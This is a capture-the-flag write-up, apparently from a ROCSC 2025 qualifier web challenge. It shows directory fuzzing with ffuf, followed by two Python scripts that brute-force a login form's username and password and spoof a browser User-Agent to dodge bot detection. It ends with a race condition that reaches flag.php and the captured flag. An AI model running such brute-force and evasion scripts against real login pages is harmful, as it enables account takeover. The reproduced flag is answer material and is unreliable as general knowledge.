<img src="https://github.com/raul-dunca/rocsc_2025_quals/blob/main/.assets/formula1_description.png">

First, I did some reconnaissance:

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://<ip>:<port>/FUZZ.php
```

Which showed `flag.php with` an HTTP 302 status code, so nothing of interest for now.
Given the message after a login attempt of “Invalid username” I created a script to brute force the username:

```python
import requests

url = "http://<ip>:<port>/login_process.php"

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36"}

with open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",encoding="utf-8") as f:
    users=[line.strip().lower() for line in f]

for user in users:
    data = {"username": user,"password": "1" }
    response = requests.post(url, headers=headers, data=data, timeout=5)
    if "Invalid username." not in response.text:
        print(f"[+] Response from {user}: {response.status_code}\n{response.text}\n")
        break
    else:
        print(f"[-] Ignoring response from {user} (Internal Server Error)")
```

Important note: the `User-Agent` header was needed because otherwise I got: "Error! Automated activity detected!"
The username I found was `max`. Now I tried to brute force the password with a similar script:

```python
import requests

url = "http://35.198.97.185:30981/login_process.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Cookie": "PHPSESSID=2df687658e7ce6d6aaab47b56b2c55e0"
}

with open("passwords.txt",encoding='utf-8', errors='ignore') as f:
     passwords=[line.strip() for line in f]
user="max"

for password in passwords:
    data = {"username": user,"password": password }
    response = requests.post(url, headers=headers, data=data, timeout=5)
    if "Invalid password." not in response.text:
        print(f"[+] Response from {password}: {response.status_code}\n{response.text}\n")
        break
    else:
         print(f"[-] Ignoring response from {password} (Internal Server Error)")
```

While the script was running, I randomly tried to send another request in my browser to `login_process.php` with a random username and password, I got as a response the expected: “Invalid username. Try again”, but when I hit back on my browser, I was at `flag.php`. At first, I thought this was a bug and not the intended solution, but I now believe it was an intentional race condition behind.
Important note: In the password script the `Cookie` header should match the browser cookie, so the race condition is triggered.

`CTF{0c7a73dbf9b5e7c97ddce7c90c6876de8194346d5f4bddacfb821dc254f2f414}`
